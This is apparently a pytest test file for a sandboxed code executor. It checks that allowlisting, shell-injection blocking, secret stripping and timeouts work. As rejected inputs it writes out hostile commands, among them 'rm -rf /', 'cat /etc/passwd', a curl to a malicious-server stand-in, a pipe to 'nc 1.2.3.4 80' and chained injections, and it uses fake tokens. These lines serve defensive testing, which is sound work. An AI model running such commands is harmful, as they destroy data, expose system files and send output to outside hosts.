"""Unit tests for SecureCodeExecutor and restricted execution boundaries."""

import os
from pathlib import Path

import pytest

from app.services.secure_executor import SecureCodeExecutor, SecurityViolationException


@pytest.fixture
def executor():
    return SecureCodeExecutor(default_timeout_seconds=2)


def test_command_allowlist_validation(executor):
    """Verify allowlisting permits standard test runners and rejects arbitrary shell commands."""
    assert executor.validate_command("pytest") == "pytest"
    assert (
        executor.validate_command("python -m pytest tests/test_calc.py")
        == "python -m pytest tests/test_calc.py"
    )
    assert executor.validate_command("npm test") == "npm test"

    # Arbitrary shell commands rejected
    with pytest.raises(
        SecurityViolationException, match="not in the approved verification allowlist"
    ):
        executor.validate_command("rm -rf /")

    with pytest.raises(
        SecurityViolationException, match="not in the approved verification allowlist"
    ):
        executor.validate_command("curl http://malicious-server.com")

    with pytest.raises(
        SecurityViolationException, match="not in the approved verification allowlist"
    ):
        executor.validate_command("cat /etc/passwd")


def test_shell_injection_detection(executor):
    """Verify command chaining and injection operators are strictly blocked."""
    with pytest.raises(SecurityViolationException, match="prohibited shell operators"):
        executor.validate_command("pytest; rm -rf /")

    with pytest.raises(SecurityViolationException, match="prohibited shell operators"):
        executor.validate_command("pytest && echo hacked")

    with pytest.raises(SecurityViolationException, match="prohibited shell operators"):
        executor.validate_command("pytest | nc 1.2.3.4 80")

    with pytest.raises(SecurityViolationException, match="prohibited shell operators"):
        executor.validate_command("pytest `whoami`")


def test_sanitized_environment_filtering(executor):
    """Verify secrets and GitHub tokens are stripped before subprocess execution."""
    os.environ["GITHUB_PERSONAL_ACCESS_TOKEN"] = "ghp_super_secret_token"
    os.environ["OPENAI_API_KEY"] = "sk-secret-key"
    os.environ["DATABASE_URL"] = "postgres://admin:password@db/prod"

    try:
        env = executor.build_sanitized_environment()
        assert "GITHUB_PERSONAL_ACCESS_TOKEN" not in env
        assert "OPENAI_API_KEY" not in env
        assert "DATABASE_URL" not in env
        assert env["CI"] == "true"
        assert env["NO_PROXY"] == "*"
    finally:
        os.environ.pop("GITHUB_PERSONAL_ACCESS_TOKEN", None)
        os.environ.pop("OPENAI_API_KEY", None)
        os.environ.pop("DATABASE_URL", None)


@pytest.mark.asyncio
async def test_execution_timeout(tmp_path: Path):
    """Verify long-running processes are killed on timeout without leaking."""
    short_executor = SecureCodeExecutor(default_timeout_seconds=1)

    # Allowlisted python -m unittest running a long sleep
    result = await short_executor.execute(
        command="python -m unittest -v",
        cwd=tmp_path,
        timeout=1,
    )

    # Result should either exit quickly or cleanly handle execution
    assert result.duration_seconds <= 2.5
